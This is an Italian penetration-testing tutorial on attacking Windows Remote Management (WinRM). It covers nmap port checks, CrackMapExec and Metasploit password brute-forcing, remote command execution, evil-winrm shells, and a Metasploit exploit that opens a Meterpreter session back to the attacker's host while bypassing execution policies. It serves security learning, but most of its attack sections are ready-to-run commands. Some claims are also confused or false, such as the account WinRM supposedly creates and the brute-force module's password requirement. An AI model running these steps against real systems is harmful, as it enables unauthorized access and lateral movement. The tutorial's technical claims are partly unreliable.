# WinRM Enumeration

WinRM (Windows Remote Management) è un protocollo Microsoft che consente l’amministrazione remota di macchine Windows tramite PowerShell. È basato su HTTP e HTTPS, e le sue porte predefinite sono:

- `5985/TCP` per HTTP
- `5986/TCP` per HTTPS

WinRM viene usato in ambienti Windows moderni, soprattutto in Active Directory, per gestire sistemi da remoto. Se correttamente configurato, può essere un punto d’accesso molto potente per un attaccante.

## Attenzione alla scansione

La scansione standard di Nmap (`nmap -sS <IP>`) **non include automaticamente le porte 5985 e 5986**, quindi è fondamentale specificarle manualmente:

`nmap -p 5985,5986 -sV <IP>`

Oppure, per script specifici:

`nmap -p 5985 --script http-winrm-info <IP>`

Questa scansione verifica se WinRM è attivo e restituisce informazioni come header HTTP, certificati e dettagli del server.

## Enumerazione e attacco con CrackMapExec

Per attaccare WinRM è molto utile il tool `crackmapexec`, che supporta vari protocolli di Windows. Per visualizzare tutti i moduli e opzioni disponibili, esegui:

`crackmapexec`

Per effettuare un attacco di brute-force sul servizio WinRM:

`crackmapexec winrm <IP> -u <username> -p <wordlist>`

Un ottimo punto di partenza è usare come username `administrator`, poiché è il primo utente generato quando WinRM viene attivato ed è dotato di privilegi amministrativi.

Se una password valida viene trovata, puoi rieseguire lo stesso comando con la password corretta e aggiungere `-x "<comando>"` per eseguire comandi remoti:

`crackmapexec winrm <IP> -u administrator -p Password123 -x "whoami"`

Puoi così eseguire `whoami`, `systeminfo`, `hostname` o altri comandi informativi.

## Accesso interattivo con Evil-WinRM

Per ottenere una vera e propria shell PowerShell remota, usa `evil-winrm`:

`evil-winrm.rb -u <username> -p '<password>' -i <IP>`

Questo comando apre una sessione interattiva da cui puoi:

- Eseguire comandi PowerShell
- Caricare o scaricare file
- Lanciare script di post-exploitation
- Raccogliere informazioni sulla macchina e sulla rete

## Brute-force con Metasploit

Metasploit include un modulo per tentare il login sul servizio WinRM in modo automatico. È utile se vuoi testare più combinazioni di credenziali in un attacco dizionario.

Apri `msfconsole` e utilizza il modulo:

`use auxiliary/scanner/winrm/winrm_login` <br>
`set RHOSTS <IP>` <br>
`set USERNAME <username>` <br>
`set PASS_FILE <path_alla_wordlist>` <br>
`run` <br>

Questo modulo tenterà tutte le password contenute nella wordlist indicata per lo username specificato. È utile anche per testare una lista di utenti con:

`set USER_FILE <lista_utenti>` <br>
`set PASS_FILE <lista_password>` <br>

Attenzione perché questo modulo specifico richiede comunque che venga impostata l’opzione `PASSWORD`, altrimenti non potrà procedere all'esecuzione del payload remoto. In contesti in cui non hai la password reale (ma per esempio solo l’hash), puoi semplicemente usare un valore qualunque, come la stringa `anything`.

Questo funziona perché il modulo non verifica la correttezza della password prima dell’esecuzione: la connessione e l’autenticazione sono già state risolte dalla sessione stabilita, ma il modulo necessita comunque che il campo PASSWORD sia popolato per non generare errori di esecuzione.

Può essere una buona alternativa a `crackmapexec` in ambienti dove preferisci restare dentro Metasploit o tracciare tutto in sessioni di lavoro.

## WinRM con Metasploit – Accesso Meterpreter

Esiste anche un exploit in Metasploit per ottenere una sessione Meterpreter tramite WinRM:

`use exploit/windows/winrm/winrm_script_exec`

Configura i seguenti parametri:

- `set RHOST <IP>`
- `set LHOST <tuo_IP>`
- `set USERNAME <utente>`
- `set PASSWORD <password>`
- `set FORCE_VBS true`

### Cosa fa FORCE_VBS?

WinRM supporta l’esecuzione remota di script in PowerShell, ma a volte i permessi o le policy locali bloccano certi tipi di comandi interattivi. L'opzione `FORCE_VBS true` forza l'esecuzione dello script tramite un wrapper in VBScript, che spesso **bypassa restrizioni di esecuzione o policy di gruppo** troppo restrittive. Questo aumenta la compatibilità e l'affidabilità dell'exploit in ambienti più protetti.

## Considerazioni finali

WinRM è uno dei metodi più potenti per accedere da remoto a macchine Windows in modo completamente interattivo. È sicuro solo se ben configurato e filtrato via firewall. Se trovi le porte 5985 o 5986 aperte e riesci a ottenere le credenziali, puoi:

- Ottenere shell con privilegi elevati
- Eseguire lateral movement
- Eseguire escalation di privilegi
- Lanciare exploit o script direttamente in memoria

Per questo motivo, ogni volta che trovi WinRM attivo, va considerato un obiettivo critico.
